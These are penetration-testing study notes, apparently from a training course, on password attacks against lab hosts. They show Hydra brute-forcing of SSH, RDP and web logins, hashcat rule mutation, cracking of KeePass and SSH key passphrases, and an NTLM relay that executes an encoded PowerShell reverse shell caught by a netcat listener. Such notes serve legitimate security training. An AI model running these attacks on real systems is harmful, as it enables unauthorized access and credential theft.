#### SSH and RDP
```
kali@kali:~$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

```
kali@kali:~$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

#### HTTP POST Login Form

```
kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt -e ns 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

##### Note: tell hydra to try username as password and to try null passwords as well ""-e ns" , Use -u to loop around users, not the passwords.!
#### Mutating Wordlists with hashcat rules

In **demo1.rule**, the rule functions are on the same line separated by a space. In this case, Hashcat will use them consecutively on each password of the wordlist. The result is that the first character of each password is capitalized AND a "1" is appended to each password.

In **demo2.rule** the rule functions are on separate lines. Hashcat interprets the second rule function, on the second line, as new rule. In this case, each rule is used separately, resulting in two mutated passwords for every password from the wordlist.

```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c
       
kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

kali@kali:~/passwordattacks$ cat demo2.rule   
$1
c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```

> Listing 16 - Using two rule functions separated by space and line

Good! We have adapted the **demo1.rule** rule file to two of the three password policies. Let's work on the third and add a special character. We'll start with "!", which is a very common special character.

Based on this assumption, we'll add **$!** to our rule file. Since we want all rule functions applied to every password, we need to specify the functions on the same line. Again, we will demonstrate this with two different rule files to stress the concept of combining rule functions. In the first rule file we'll add **\$!** to the end of the first rule. In the second rule file we'll add it at the beginning of the rule.

```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c $!

kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

kali@kali:~/passwordattacks$ cat demo2.rule   
$! $1 c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```

#### Cracking Password managers masterkeys

1. Look for keepass database files:

```
PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
2. Convert the kdbx database file to john format
```
kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash   

kali@kali:~/passwordattacks$ cat keepass.hash   
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```
3. Remove the filename that's appended at the beginning of the file.:
After removing the "Database:" string the hash is in the correct format for Hashcat:

```
kali@kali:~/passwordattacks$ cat keepass.hash   
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
```
4. Find the correct mode and crack it:
```
kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat (v6.2.5) starting
...
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
...
```

#### SSH Private Key Passphrase cracking
1. Convert the private key to john format:
```
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
```
2. Find the correct mode and crack it using hashcat:
```
kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.5) starting
...

Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.
...
```


#### NTLM Relaying
1. Setup the fake SMB server on kali that will listing for smb connections and will relay the auth to the target host
```
kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Note: We'll use **--no-http-server** to disable the HTTP server since we are relaying an SMB connection and **-smb2support** to add support for _SMB2_.[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/relaying-net-ntlmv2#fn3) We'll also use **-t** to set the target to FILES02. Finally, we'll set our command with **-c**, which will be executed on the target system as the relayed user. We'll use a PowerShell reverse shell one-liner,[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/relaying-net-ntlmv2#fn4) which we'll base64-encode and execute with the **-enc** argument as we've done before in this course. We should note that the base64-encoded PowerShell reverse shell one-liner is shortened in the following listing, but it uses the IP of our Kali machine and port 8080 for the reverse shell to connect.

2. Next, we'll start a Netcat listener on port 8080 (in a new terminal tab) to catch the incoming reverse shell.

```
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ...
```

3. Force authentication to the kali server, could be somthing simple like running net view or dir 


#### Cracking Domain Cache credentials

To crack mscache with hashcat, it should be in the following format:
```
$DCC2$10240#username#hash
```

For example:
![[Pasted image 20231011222832.png]]
